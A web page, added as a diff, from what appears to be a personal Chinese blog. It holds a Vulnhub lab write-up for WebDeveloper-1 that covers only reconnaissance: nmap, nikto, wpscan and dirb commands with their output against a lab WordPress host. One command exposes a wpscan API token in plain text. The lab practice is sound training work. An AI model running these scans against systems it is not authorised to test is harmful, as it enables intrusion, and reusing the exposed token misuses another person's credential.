@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-29.WebDeveloper-1 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-29.WebDeveloper-1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 8, 2024&nbsp;&nbsp;11:17:02</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="WebDeveloper-1"><a href="#WebDeveloper-1" class="headerlink" title="WebDeveloper-1"></a>WebDeveloper-1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.240.136</span>     nmap --min-rate <span class="number">100000</span> -p80,<span class="number">22</span> -A <span class="number">192.168.240.136</span></span><br><span class="line"><span class="attribute">nikto</span> -host <span class="number">192.168.240.136</span> -p <span class="number">80</span></span><br><span class="line"><span class="attribute">wpscan</span> --url http://<span class="number">192.168.240.136</span>/ -eu --api-token rhXTa9t3zrV0zXuzHKI6pV7H37cfl41OQqYNgQyWH5k</span><br><span class="line"><span class="attribute">dirb</span>  http://<span class="number">192.168.240.136</span>/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ nmap <span class="comment">--min-rate 100000 -p80,22 -A 192.168.240.136</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span>SVN ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2024</span><span class="number">-12</span><span class="number">-08</span> <span class="number">19</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span></span><br><span class="line">Host is up (<span class="number">0.00036</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   <span class="number">2048</span> d2:ac:<span class="number">73</span>:<span class="number">4</span>c:<span class="number">17</span>:ec:<span class="number">6</span><span class="keyword">a</span>:<span class="number">82</span>:<span class="number">79</span>:<span class="number">87</span>:<span class="number">5</span><span class="keyword">a</span>:f9:<span class="number">22</span>:d4:<span class="number">12</span>:cb (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">9</span>c:d5:f3:<span class="number">2</span>c:e2:d0:<span class="number">06</span>:cc:<span class="number">8</span>c:<span class="number">15</span>:<span class="number">5</span><span class="keyword">a</span>:<span class="number">5</span><span class="keyword">a</span>:<span class="number">81</span>:<span class="number">5</span>b:<span class="number">03</span>:<span class="number">3</span>d (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ab:<span class="number">67</span>:<span class="number">56</span>:<span class="number">69</span>:<span class="number">27</span>:ea:<span class="number">3</span>e:<span class="number">3</span>b:<span class="number">33</span>:<span class="number">73</span>:<span class="number">32</span>:f8:ff:<span class="number">2</span>e:<span class="number">1</span>f:<span class="number">20</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span>    Apache httpd <span class="number">2.4</span><span class="number">.29</span> ((Ubuntu))</span><br><span class="line">|<span class="title">_http-title</span>: Database Error</span><br><span class="line">|<span class="title">_http-server-header</span>: Apache/<span class="number">2.4</span><span class="number">.29</span> (Ubuntu)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">99</span>:<span class="number">3</span>D:<span class="number">7</span>A (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could <span class="keyword">not</span> find <span class="keyword">at</span> least <span class="number">1</span> <span class="built_in">open</span> <span class="keyword">and</span> <span class="number">1</span> closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">3.</span>X|<span class="number">4.</span>X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS details: Linux <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.36</span> ms <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span></span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.28</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nikto</span> -host <span class="number">192.168.240.136</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -host <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span> -p <span class="number">80</span></span><br><span class="line">- Nikto v2<span class="number">.5</span><span class="number">.0</span></span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span></span><br><span class="line">+ Target Hostname:    <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span></span><br><span class="line">+ Target Port:        <span class="number">80</span></span><br><span class="line">+ <span class="keyword">Start</span> <span class="type">Time</span>:         <span class="number">2024</span><span class="number">-12</span><span class="number">-08</span> <span class="number">19</span>:<span class="number">38</span>:<span class="number">15</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.29</span> (Ubuntu)</span><br><span class="line">+ /: The anti-clickjacking X-Frame-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-<span class="keyword">Options</span></span><br><span class="line">+ /: The X-Content-<span class="keyword">Type</span>-<span class="keyword">Options</span> <span class="keyword">header</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span>. This could allow the <span class="keyword">user</span> agent <span class="keyword">to</span> render the content <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-<span class="keyword">type</span>-<span class="keyword">header</span>/</span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="built_in">found</span> (use <span class="string">&#x27;-C all&#x27;</span> <span class="keyword">to</span> force <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Apache/<span class="number">2.4</span><span class="number">.29</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> at least Apache/<span class="number">2.4</span><span class="number">.54</span>). Apache <span class="number">2.2</span><span class="number">.34</span> <span class="keyword">is</span> the EOL <span class="keyword">for</span> the <span class="number">2.</span>x branch.</span><br><span class="line">+ /xmlrpc.php: xmlrpc.php was <span class="built_in">found</span>.</span><br><span class="line">+ /icons/README: Apache <span class="keyword">default</span> file <span class="built_in">found</span>. See: https://www.vntweb.co.uk/apache-restricting-<span class="keyword">access</span>-<span class="keyword">to</span>-iconsreadme/</span><br><span class="line">+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin <span class="string">&#x27;Tested up to&#x27;</span> <span class="keyword">version</span> usually matches the WordPress <span class="keyword">version</span>.</span><br><span class="line">+ /license.txt: License file <span class="built_in">found</span> may identify site software.</span><br><span class="line">+ /wp-<span class="keyword">admin</span>/: <span class="keyword">Admin</span> <span class="keyword">login</span> page/section <span class="built_in">found</span>.</span><br><span class="line">+ /wp-content/uploads/: Directory indexing <span class="built_in">found</span>.</span><br><span class="line">+ /wp-content/uploads/: Wordpress uploads directory <span class="keyword">is</span> browsable. This may reveal sensitive information.</span><br><span class="line">+ <span class="number">8102</span> requests: <span class="number">0</span> error(s) <span class="keyword">and</span> <span class="number">10</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="type">Time</span>:           <span class="number">2024</span><span class="number">-12</span><span class="number">-08</span> <span class="number">19</span>:<span class="number">38</span>:<span class="number">27</span> (GMT8) (<span class="number">12</span> seconds)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ penetration in /mnt/c/Users/Anonymous/Desktop [19:45:55] C:4</span></span><br><span class="line">$ wpscan --url http://192.168.240.136/ -eu --api-token rhXTa9t3zrV0zXuzHKI6pV7H37cfl41OQqYNgQyWH5k</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|<span class="string"></span></span><br><span class="line"><span class="string">          \ \  /\  / /</span>|<span class="string"> </span>|<span class="string">__) </span>|<span class="string"> (___   ___  __ _ _ __ ®</span></span><br><span class="line"><span class="string">           \ \/  \/ / </span>|<span class="string">  ___/ \___ \ / __</span>|<span class="string">/ _` </span>|<span class="string"> &#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  </span>|<span class="string"> </span>|<span class="string">     ____) </span>|<span class="string"> (__</span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">             \/  \/   |<span class="string">_</span>|<span class="string">    </span>|<span class="string">_____/ \___</span>|<span class="string">\__,_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.27</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       <span class="meta">@_WPScan_,</span> <span class="meta">@ethicalhack3r,</span> <span class="meta">@erwan_lr,</span> <span class="meta">@firefart</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.240.136/ [192.168.240.136]</span><br><span class="line">[+] Started: Sun Dec  8 19:48:06 2024</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> |<span class="string"> Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://192.168.240.136/xmlrpc.php</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 100%</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> References:</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://192.168.240.136/readme.html</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.240.136/wp-content/uploads/</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://192.168.240.136/wp-cron.php</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 60%</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> References:</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - http://192.168.240.136/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.9.8&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - http://192.168.240.136/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.9.8&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> </span>|</span><br><span class="line"> |<span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentyseventeen</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Location: http://192.168.240.136/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Last Updated: 2024-11-12T00:00:00.000Z</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Readme: http://192.168.240.136/wp-content/themes/twentyseventeen/README.txt</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> [!] The version is out of date, the latest version is 3.8</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Style URL: http://192.168.240.136/wp-content/themes/twentyseventeen/style.css?ver=4.9.8</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Author: the WordPress team</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> </span>|</span><br><span class="line"> |<span class="string"> Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> </span>|</span><br><span class="line"> |<span class="string"> Version: 1.7 (80% confidence)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  - http://192.168.240.136/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: &#x27;Version: 1.7&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;===================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] webdeveloper</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confirmed By:</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string">   - http://192.168.240.136/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string">  Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span 